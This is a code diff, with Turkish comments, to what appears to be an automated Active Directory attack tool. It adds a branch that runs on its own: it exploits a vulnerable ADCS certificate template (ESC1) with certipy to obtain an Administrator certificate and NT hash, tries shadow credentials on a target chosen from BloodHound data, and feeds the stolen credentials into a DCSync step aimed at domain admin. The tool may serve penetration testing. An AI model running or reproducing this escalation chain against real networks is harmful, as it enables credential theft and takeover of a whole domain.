@@ -185,6 +185,41 @@ def _mark(sym: str, ui) -> str:
     return f"{hot}{sym}\033[0m" if hot else sym
 
 
+def _adcs_shadow_branch(ctx: ScanContext, report: ScanReport, ui) -> None:
+    """Otonom ADCS/Shadow yükseltme dalı (reuse zincirinden önce bir kez).
+
+    1) Raporda ESC1 bulgusu varsa certipy ile Administrator sertifikası al -> NT hash.
+    2) BloodHound first-degree'de AddKeyCredentialLink/GenericAll olan bir hedefte
+       shadow credentials ile NT hash al.
+    Üretilen kimlikler report.credentials'a eklenir; DCSync turu bunları kullanır.
+    """
+    before = len(report.credentials)
+    # 1) ESC1 (varsa) — onay autopilot'ta zaten alındı (force=True)
+    try:
+        from .modules import certipy_scan
+        if any(f.control_id == "adcs.esc1" for f in report.findings):
+            _say(ui, f"  {_mark('+', ui)} ADCS: ESC1 bulgusu var — Administrator "
+                     "sertifikası isteniyor (certipy req/auth)")
+            certipy_scan.exploit_esc1(ctx, report, force=True)
+    except Exception as exc:  # noqa: BLE001
+        _say(ui, f"  (escalate/adcs: ESC1 istismarı atlandı: {exc})")
+    # 2) Shadow credentials (BH'den hedef seçer)
+    try:
+        from .modules import shadow_scan
+        res = shadow_scan.scan(ctx, timeout=ctx.timeout)
+        first = res[0] if res else None
+        if not (first and first.tool == "shadow:skip"):
+            _say(ui, f"  {_mark('+', ui)} ADCS: shadow credentials deneniyor "
+                     "(certipy shadow auto)")
+            shadow_scan.parse(res, report)
+    except Exception as exc:  # noqa: BLE001
+        _say(ui, f"  (escalate/shadow: atlandı: {exc})")
+    gained = len(report.credentials) - before
+    if gained > 0:
+        _say(ui, f"  {_mark('★', ui)} ADCS/Shadow: {gained} yeni yüksek-yetki kimliği "
+                 "havuza eklendi")
+
+
 # ---------------------------------------------------------------------------
 # Motor
 # ---------------------------------------------------------------------------
@@ -198,6 +233,12 @@ def run_to_da(ctx: ScanContext, report: ScanReport, *, ui=None) -> bool:
     if not any(c.secret for c in report.credentials):
         _say(ui, "  (escalate: denenecek kimlik yok — spray/seed kimlik gerekli)")
         return False
+
+    # ADCS/Shadow dalı: reuse/DCSync'ten ÖNCE, savunmasız ADCS şablonu (ESC1) ya da
+    # kontrol edilebilir bir hedef (shadow creds) varsa doğrudan yüksek-yetki NT hash
+    # üret ve kimlik havuzuna kat — sonraki turda DCSync bunu kullanır.
+    if not ctx.dry_run:
+        _adcs_shadow_branch(ctx, report, ui)
 
     if ctx.dry_run:
         _say(ui, "  [PLAN] Yükseltme zinciri (çalıştırılmadı):")
